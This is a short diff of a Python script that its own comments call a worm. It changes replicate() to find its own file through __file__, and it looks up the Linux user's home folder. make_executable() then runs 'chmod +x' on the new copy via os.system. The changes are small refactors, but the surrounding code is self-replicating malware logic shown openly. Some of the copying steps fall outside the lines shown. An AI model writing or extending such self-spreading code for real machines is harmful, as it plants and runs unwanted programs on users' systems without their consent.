@@ -8,8 +8,11 @@ import random
 
 def replicate():
 
+	#get the name of the current iteration of the worm
+	filename = os.path.basename(__file__)
+
 	#find the current location of the worm file
-	location = os.path.abspath("wormreplicate.py")
+	location = os.path.abspath(filename)
 
 	#get the username of Linux user to know the home folder location
 	user = getpass.getuser()
@@ -28,14 +31,14 @@ def replicate():
 
 def make_executable(destination):
 
-	target = destination
 	#sets the target for permission changes to be the newly created file
+	target = destination
 
+	#sets a command to make a file executable	
 	cmd = "chmod +x" + " " + destination
-	#sets a command to make a file executable
 
-	os.system(cmd)
 	#run the command
+	os.system(cmd)
 
 def main():
 	destination = replicate()
@@ -44,4 +47,3 @@ def main():
 
 if __name__ == "__main__":
 	main()
-
